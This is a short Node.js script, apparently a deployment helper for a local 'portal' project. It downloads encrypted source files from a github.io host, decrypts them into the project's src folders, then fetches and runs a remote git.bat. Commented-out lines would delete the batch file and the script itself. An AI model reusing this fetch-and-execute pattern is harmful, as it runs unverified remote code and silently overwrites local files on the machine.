const fs = require('fs')
const path = require('path')
const request = require('request')
const process = require('process')
const secret = require('./secret')
const execSync = require('./execSync')
const target = 'd:\\portal\\'
const files = [
  {'name': 'c.vue', 'path': target + 'src\\pages\\'},
  {'name': 'userInfo.js', 'path': target + 'src\\api\\'},
  {'name': 'index.js', 'path': target + 'src\\api\\'}
]
let count = 0
for (let file of files) {
  request('https://8230459.github.io/b/' + file.name, {}, async (err, res, body) => {
    if (err) return
    fs.createWriteStream(path.join(file.path, file.name)).write(secret.UnLock(body))
    count++
  })
}
const timer = setTimeout(async () => {
  if (count === files.length) {
    request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
      if (err) return
      await execSync('git.bat')
      //await fs.rmSync('git.bat', {recursive: true})
      //await fs.rmSync('get.js', {recursive: true})
      //await execSync('node jenkins.js')
      process.exit()
    })
    clearTimeout(timer)
  }
}, 5000)
